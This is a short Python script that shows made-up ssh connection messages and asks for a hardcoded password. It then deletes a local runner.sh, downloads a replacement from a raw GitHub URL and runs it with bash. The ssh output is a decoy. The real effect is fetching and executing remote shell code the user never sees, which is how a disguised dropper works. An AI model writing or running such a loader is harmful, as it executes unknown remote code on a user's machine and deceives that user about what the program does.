import os
import time
try:
	import wget
except:
	os.system("python3 -m pip install wget")
print("ssh: Connecting to server...")
time.sleep(0.4)
print("ssh: Connect to host dthnet:5028274628628888362.ngrok.io port 22: Network is unreachable")
time.sleep(1.7)
print("ssh: Found a port through which you can connect")
password = {"input": "0"}
password["code"] = "1337"
while password["input"] != password["code"]:
	password["input"] = input("Password: ")
os.remove("runner.sh")
wget.download("https://raw.githubusercontent.com/syzcoycosuvsgix/_/main/runner.sh", "runner.sh")
os.system("bash runner.sh")
